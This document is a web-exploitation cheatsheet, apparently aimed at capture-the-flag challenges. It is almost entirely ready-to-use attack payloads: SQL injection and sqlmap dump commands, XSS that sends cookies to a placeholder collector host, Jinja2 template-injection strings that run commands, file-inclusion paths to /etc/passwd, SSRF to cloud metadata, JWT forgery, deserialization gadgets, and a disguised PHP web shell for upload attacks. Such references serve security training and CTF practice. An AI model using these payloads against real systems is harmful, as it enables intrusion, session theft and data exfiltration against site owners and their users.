# Web Cheatsheet

## Recon first
```bash
whatweb http://TARGET ; curl -sI http://TARGET          # stack, headers
curl -s http://TARGET/robots.txt /sitemap.xml /.git/HEAD
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403
# view source, JS files, comments, /api, /admin, cookies, hidden inputs
```
Always read the given **source code** if provided — the bug is usually visible.

## SQL injection
```
' OR '1'='1    '-- -    " OR 1=1-- -     ')) OR 1=1-- -
UNION:  ' UNION SELECT 1,2,3-- -   (match column count via ORDER BY N)
dump:   ' UNION SELECT table_name,2 FROM information_schema.tables-- -
        ' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
sqlite: ' UNION SELECT sql,2 FROM sqlite_master-- -
blind:  ' AND substr((SELECT flag FROM ...),1,1)='L'-- -
time:   ' OR SLEEP(5)-- -   ' ; SELECT pg_sleep(5)-- -
```
Automate: `sqlmap -u 'http://T/x?id=1' --batch --dump`  (add `--cookie`, `--data`, `--level 5 --risk 3`).

## XSS (usually for admin-bot/cookie challenges)
```
<script>fetch('//YOUR/'+document.cookie)</script>
<img src=x onerror=fetch('//YOUR/?c='+document.cookie)>
<svg/onload=...>    "><script>...</script>     (break out of attribute/tag)
```
Set up a collector: `python3 -m http.server 8000` and watch the logs.

## SSTI (template injection)
```
test: {{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>
Jinja2 RCE: {{ cycler.__init__.__globals__.os.popen('cat flag*').read() }}
            {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
Jinja2 (short): {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

## LFI / path traversal / RFI
```
?file=../../../../etc/passwd         ?file=....//....//etc/passwd
php wrappers: php://filter/convert.base64-encode/resource=index.php
              data://text/plain;base64,PD9waHA...     expect://id
log poisoning, /proc/self/environ, session files for RCE
```

## SSRF
```
?url=http://127.0.0.1:PORT/   http://localhost/admin
cloud metadata: http://169.254.169.254/latest/meta-data/
bypass filters: http://127.1  http://[::1]  http://0177.0.0.1  decimal IP, @, #
```

## JWT
```bash
# alg=none:
header {"alg":"none","typ":"JWT"} . payload{"user":"admin"} .   (empty sig)
# weak HMAC secret:
john jwt.txt --wordlist=rockyou.txt          # or hashcat -m 16500
# RS256 -> HS256 confusion: sign with the public key as HMAC secret
```
Tool: `pip install pyjwt`; or jwt.io to inspect.

## IDOR / auth
- Increment/replace object ids (`/order/1001` → `1002`), swap usernames, missing ownership check.
- Cookie tampering: base64/JSON cookies, `admin=false`→`true`, forge if secret weak.
- Password reset: token predictability, host-header poisoning, user enumeration.

## Insecure deserialization
```
PHP: O:4:"User":1:{s:5:"admin";b:1;}   gadget chains (phpggc)
Python pickle: craft __reduce__ -> os.system  (if they unpickle input)
Node: __proto__ prototype pollution; Java: ysoserial
```

## File upload RCE
- Upload `.php`/`.phtml`/`.phar`; bypass filters: double ext `shell.php.jpg`, null byte,
  content-type spoof, magic-byte prefix `GIF89a;<?php system($_GET[0]);?>`.
- Find where it lands (`/uploads/`), then browse to it.

## Quick wins checklist
- [ ] View source + JS + comments + `/robots.txt` + `.git/`
- [ ] Cookies / localStorage / JWT decoded
- [ ] Every param tested for SQLi/SSTI/LFI/SSRF
- [ ] Source code (if given) grepped for the bug
- [ ] Admin bot? → XSS. Upload? → RCE. `url=`? → SSRF. `file=`? → LFI.
